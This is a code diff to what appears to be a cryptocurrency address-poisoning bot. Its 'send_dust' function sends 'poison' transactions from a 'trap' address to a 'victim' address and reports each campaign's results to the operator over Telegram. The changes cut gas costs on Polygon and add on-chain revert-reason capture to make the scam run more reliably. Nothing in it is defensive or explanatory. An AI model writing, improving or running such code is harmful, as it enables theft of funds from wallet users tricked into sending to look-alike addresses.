@@ -466,7 +466,7 @@ def send_dust(private_key, victim_address, campaign_id=None):
             # --- LOW GAS OPTIMIZATION ---
             # 1. Cap priority fee to low fixed value based on chain
             if CHAIN.lower() == "polygon":
-                max_priority = w3.to_wei(30, "gwei")  # Polygon network minimum
+                max_priority = w3.to_wei(0.05, "gwei")  # Polygon network minimum
             elif CHAIN.lower() == "ethereum":
                 max_priority = w3.to_wei(0.05, "gwei") # Low priority tip (0.05 Gwei vs standard 1+ Gwei)
             else:
@@ -598,8 +598,22 @@ def send_dust(private_key, victim_address, campaign_id=None):
                 send_telegram(success_msg, campaign_id=campaign_id)
                 return True
             else:
-                logger.error("Transaction reverted on-chain.")
-                send_telegram(f"❌ Poison transaction reverted on-chain.\nVictim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}", campaign_id=campaign_id)
+                # Attempt to get the exact revert reason via eth_call simulation
+                revert_reason = "Unknown (Status 0)"
+                try:
+                    # Simulate the transaction to capture the revert string
+                    w3.eth.call(tx)
+                except Exception as call_err:
+                    # Clean up the error string for a cleaner Telegram message
+                    revert_reason = str(call_err).replace("execution reverted: ", "").replace("revert ", "").strip()
+                
+                logger.error(f"Transaction reverted on-chain. Reason: {revert_reason}")
+                send_telegram(
+                    f"❌ Poison transaction reverted on-chain.\n"
+                    f"Victim: {victim}\nTrap: {trap}\nTX: {tx_hash.hex()}\n"
+                    f"Reason: {revert_reason}", 
+                    campaign_id=campaign_id
+                )
                 return False
                 
         except TimeExhausted:
